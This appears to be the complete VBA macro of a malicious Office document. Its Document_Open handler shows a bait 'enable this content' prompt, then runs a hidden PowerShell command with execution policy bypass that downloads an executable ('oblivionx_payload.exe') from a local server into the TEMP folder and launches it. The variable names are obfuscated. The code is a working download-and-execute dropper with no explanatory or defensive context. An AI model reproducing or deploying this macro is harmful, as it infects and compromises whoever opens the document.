Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    If MsgBox("Do you want to enable this content?", vbYesNo) <> vbYes Then
        Exit Sub
    End If
    Dim frs0swbone As String
    Dim bwt1msm67xb As Object
    Dim pj16ga84d1wp As String, outPath As String
    pj16ga84d1wp = "http://127.0.0.1:9090/payload.exe"
    outPath = Environ("TEMP") & "\oblivionx_payload.exe"
    frs0swbone = "powershell.exe -NoProfile -WindowStyle Hidden " & _
          "-ExecutionPolicy Bypass -Command " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & pj16ga84d1wp & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set bwt1msm67xb = CreateObject("WScript.Shell")
    bwt1msm67xb.Run frs0swbone, 0, False
End Sub
